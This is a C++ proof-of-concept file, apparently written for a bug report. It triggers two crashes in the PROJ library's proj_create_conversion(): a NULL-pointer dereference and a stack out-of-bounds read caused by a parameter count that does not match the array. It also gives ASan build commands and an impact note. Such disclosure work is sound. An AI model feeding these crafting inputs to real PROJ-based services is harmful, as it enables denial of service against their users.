// SF02 PoC: Two bugs in setSingleOperationElements() called by
//           proj_create_conversion() and proj_create_transformation()
//
// CONFIRMED CRASHES (ASan):
//   Bug 1: NULL pointer dereference when param_count > 0 but params == NULL
//   Bug 2: Stack buffer overflow (OOB read) when param_count > actual array size
//
// VULNERABLE FUNCTION:
//   static void setSingleOperationElements(..., int param_count,
//     const PJ_PARAM_DESCRIPTION *params, ...)
//   Location: /src/PROJ/src/iso19111/c_api.cpp:4422
//
// VULNERABLE CODE:
//   for (int i = 0; i < param_count; i++) {
//       // No NULL check on params before this loop!
//       propParam.set(..., params[i].name ? params[i].name : "unnamed");  // line 4446
//       ...
//       values.emplace_back(ParameterValue::create(Measure(params[i].value, ...)));
//   }
//
// AFFECTED APIs:
//   - proj_create_conversion()  (c_api.cpp:4511)
//   - proj_create_transformation() (c_api.cpp:4566)
//
// IMPACT:
//   Bug 1 (NULL deref): Crash/SIGSEGV - attacker can cause DoS
//   Bug 2 (stack OOB): Crash + potential info disclosure or control flow hijack
//
// COMPILE & RUN:
//   clang++ -std=c++17 -fsanitize=address -g -O1 \
//     -I/src/PROJ/include -I/src/PROJ/src conv_SF02_poc.cpp \
//     /proj4-build/lib/libproj.a \
//     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm -o conv_SF02_poc
//   ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan ./conv_SF02_poc

#include "proj.h"
#include <stdio.h>
#include <string.h>

// Bug 1: proj_create_conversion with param_count=1, params=NULL -> NULL deref
static void test_bug1_null_deref(PJ_CONTEXT *ctx) {
    printf("\n[Bug 1] param_count=1, params=NULL -> NULL ptr dereference\n");
    printf("  Calling proj_create_conversion(..., 1, NULL)...\n");

    PJ *conv = proj_create_conversion(
        ctx,
        "test_null_params", NULL, NULL,          // name, auth, code
        "Transverse Mercator", "EPSG", "9807",   // method
        1,                                        // param_count > 0
        NULL);                                    // params = NULL -> CRASH

    // Should not reach here
    if (conv) {
        printf("  ERROR: Created OK (no crash, possible fix applied)\n");
        proj_destroy(conv);
    } else {
        printf("  ERROR: Returned NULL without crash (possible fix applied)\n");
    }
}

// Bug 2: proj_create_conversion with param_count > actual array size -> OOB read
static void test_bug2_oob_read(PJ_CONTEXT *ctx) {
    printf("\n[Bug 2] param_count=10 with only 2 valid entries -> stack OOB read\n");

    // Stack-allocated array with only 2 entries
    PJ_PARAM_DESCRIPTION params[2];
    memset(params, 0, sizeof(params));

    params[0].name = "Latitude of natural origin";
    params[0].auth_name = "EPSG";
    params[0].code = "8801";
    params[0].value = 0.0;
    params[0].unit_conv_factor = 0.0174532925199433;
    params[0].unit_name = "degree";
    params[0].unit_type = PJ_UT_ANGULAR;

    params[1].name = "Longitude of natural origin";
    params[1].auth_name = "EPSG";
    params[1].code = "8802";
    params[1].value = 0.0;
    params[1].unit_conv_factor = 0.0174532925199433;
    params[1].unit_name = "degree";
    params[1].unit_type = PJ_UT_ANGULAR;

    printf("  Calling proj_create_conversion(..., 10, params[2])...\n");
    PJ *conv = proj_create_conversion(
        ctx,
        "test_oob_params", NULL, NULL,
        "Transverse Mercator", "EPSG", "9807",
        10,     // param_count = 10, but only params[0] and params[1] are valid
        params); // reads params[2..9] beyond end of array -> CRASH (stack OOB)

    // Should not reach here
    if (conv) {
        printf("  ERROR: Created OK (no crash, possible fix applied)\n");
        proj_destroy(conv);
    } else {
        printf("  ERROR: Returned NULL without crash\n");
    }
}

int main(void) {
    PJ_CONTEXT *ctx = proj_context_create();
    proj_log_level(ctx, PJ_LOG_NONE);

    printf("=== SF02: setSingleOperationElements NULL deref / OOB read ===\n");
    printf("    Source: /src/PROJ/src/iso19111/c_api.cpp:4443-4495\n");

    test_bug1_null_deref(ctx);
    // Bug 2 would be tested here but program exits after Bug 1 crash.
    // Run separately by commenting out test_bug1_null_deref().
    test_bug2_oob_read(ctx);

    proj_context_destroy(ctx);
    printf("\n=== SF02 tests completed ===\n");
    return 0;
}
